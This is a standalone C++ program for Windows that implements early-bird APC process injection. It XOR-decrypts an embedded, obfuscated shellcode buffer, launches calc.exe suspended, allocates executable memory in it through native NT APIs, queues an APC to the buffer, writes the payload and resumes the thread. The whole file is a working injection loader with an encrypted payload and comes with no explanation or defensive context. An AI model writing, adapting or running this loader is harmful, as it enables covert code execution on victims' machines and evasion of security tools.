#include <iostream>
#include <Windows.h>
#include <ntstatus.h>

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

extern "C" NTSTATUS NTAPI NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL
);

extern "C" NTSTATUS NTAPI NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
);

extern "C" NTSTATUS NTAPI NtQueueApcThread(
    IN HANDLE ThreadHandle,
    IN PVOID ApcRoutine,
    IN PVOID ApcArgument1 OPTIONAL,
    IN PVOID ApcArgument2 OPTIONAL,
    IN PVOID ApcArgument3 OPTIONAL
);

void xorDecrypt(unsigned char* data, int length, const std::string& key) {
    int keyLength = key.length();
    for (int i = 0; i < length; i++) {
        data[i] = data[i] ^ key[i % keyLength];
    }
}

int main() {
    std::cout << "Current process PID is " << GetCurrentProcessId() << std::endl;
    system("pause");

    // shellcode 
    unsigned char buf[] =
    	"\x98\x7b\xe0\x96\xc1\x98\xb4\x69\x30\x6e\x2a\x62\x38\x34"
    	"\x61\x32\x24\x79\x41\xa6\x0c\x78\xe5\x39\x53\x31\xef\x61"
    	"\x7b\x3a\xba\x22\x54\x21\xbb\x1c\x3b\x7b\x76\xd3\x79\x29"
    	"\x3f\x00\xb9\x3c\x58\xf0\xc2\x57\x52\x05\x66\x1f\x43\x33"
    	"\xf0\xb9\x79\x28\x31\xaf\x89\xde\x2b\x25\x62\x2b\xf9\x63"
    	"\x50\xff\x2b\x0c\x26\x6a\xe3\xf2\xe4\xbb\x63\x72\x31\x38"
    	"\xf1\xa9\x44\x09\x23\x32\xa9\x34\xb8\x2b\x6a\x75\xfb\x34"
    	"\x49\x79\x6f\xbb\xd0\x2f\x2c\xcc\xaa\x33\xba\x44\xfc\x21"
    	"\x31\xb8\x26\x02\xb0\x2c\x02\xa3\xde\x70\xb1\xbd\x64\x71"
    	"\x6f\xaa\x0b\x99\x11\xc2\x2f\x71\x7d\x54\x7c\x2c\x09\xbf"
    	"\x1e\xeb\x21\x20\xb8\x23\x56\x78\x71\xa4\x0f\x71\xe5\x67"
    	"\x7b\x3d\xef\x73\x7f\x3b\x30\xa0\x35\xe2\x34\xe6\x23\x32"
    	"\xa9\x25\x6b\x22\x2a\x6f\x29\x2e\x28\x68\x2f\x32\x72\x23"
    	"\x2c\xb0\x8f\x52\x70\x22\x8b\x89\x68\x2f\x32\x69\x31\xef"
    	"\x21\x8a\x25\xce\x8f\x8b\x34\x79\xd0\x1c\x40\x4b\x3b\x00"
    	"\x51\x72\x31\x31\x22\x20\xb9\x88\x23\xb2\x95\xc4\x32\x63"
    	"\x72\x78\xf9\x91\x20\x8c\x6c\x6b\x22\x25\xa4\x9b\x43\x38"
    	"\x70\x24\x3d\xe0\xd4\x22\xe2\xc2\x38\xde\x7f\x14\x54\x36"
    	"\x8f\xa1\x25\xb9\x84\x03\x32\x78\x64\x33\x3a\x33\x8b\x59"
    	"\xf4\x02\x30\x91\xbe\x63\x29\x29\x02\xaa\x3f\x00\xb0\x3c"
    	"\x96\xf0\x26\xe2\xf1\x31\x9b\xf3\x2b\xfb\xf0\x31\xce\x83"
    	"\x3f\xb1\x8b\xcc\xac\x2c\xba\xa4\x18\x21\x31\x2c\x25\xb9"
    	"\x8c\x23\xba\x80\x25\x89\xfa\xd7\x45\x11\x8b\xbc\x78\xef"
    	"\xaf\x73\x7b\x64\x33\x2a\xca\x52\x1d\x10\x69\x30\x6e\x6b"
    	"\x33\x38\x34\x72\x33\x3a\xb8\x92\x23\x3e\x67\x23\x5a\xf3"
    	"\x13\x69\x6a\x22\x22\xd3\x8c\x12\xae\x74\x4a\x3f\x32\x78"
    	"\x2c\xbe\x27\x56\x29\xb6\x74\x01\x78\xe7\x8d\x65\x29\x25"
    	"\x63\x22\x22\x70\x20\x3d\x96\xf0\x2f\x3b\x7a\x86\xac\x7e"
    	"\xea\xb3\x7d\xf9\xb5\x28\x8a\x17\xa7\x0c\xff\x9b\xe6\x2b"
    	"\x43\xe3\x38\x8b\xa3\xbb\x60\x2a\x89\x71\xe3\x2e\x03\x8d"
    	"\xe4\xcb\x84\xdc\x92\x38\x2a\x89\xdf\xf1\x8e\xfe\x8d\xe4"
    	"\x38\xf7\xad\x18\x52\x6d\x4f\x73\xe4\xc8\x83\x07\x34\xcb"
    	"\x33\x7a\x42\x01\x01\x33\x20\x25\xba\xb9\x8d\xe4";

    //shellcode
    xorDecrypt(buf, sizeof(buf) - 1, "<DecryptionKey>");

    SIZE_T payload_size = sizeof(buf);

    char processPath[] = "C:\\Windows\\System32\\calc.exe";

    STARTUPINFOA startprocess = { 0 };
    PROCESS_INFORMATION processinfo = { 0 };
    if (!CreateProcessA(processPath, NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &startprocess, &processinfo)) {
        std::cout << "Failed to Create a New Process ! " << std::endl;;
        return 1;
    }

    HANDLE hprocess = processinfo.hProcess;
    HANDLE hthread = processinfo.hThread;

    PVOID remotebuffer = NULL;
    SIZE_T regionSize = payload_size;
    NTSTATUS status = NtAllocateVirtualMemory(hprocess, &remotebuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        std::cout << "Failed to allocate the memory!" << std::endl;
        CloseHandle(hprocess);
        CloseHandle(hthread);
        return 1;
    }

    status = NtQueueApcThread(hthread, remotebuffer, NULL, NULL, NULL);
    if (status != STATUS_SUCCESS) {
        std::cout << "Failed to queue APC thread!" << std::endl;
        CloseHandle(hprocess);
        CloseHandle(hthread);
        return 1;
    }

    SIZE_T bytesWritten;
    status = NtWriteVirtualMemory(hprocess, remotebuffer, buf, payload_size, &bytesWritten);
    if (status != STATUS_SUCCESS) {
        std::cout << "Failed to Write the memory!" << std::endl;
        CloseHandle(hprocess);
        CloseHandle(hthread);
        return 1;
    }

    ULONG oldProtect;
    status = NtProtectVirtualMemory(hprocess, &remotebuffer, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != STATUS_SUCCESS) {
        std::cout << "Failed to change the memory protection!" << std::endl;
        CloseHandle(hprocess);
        CloseHandle(hthread);
        return 1;
    }

    ResumeThread(hthread);
    return 0;
}
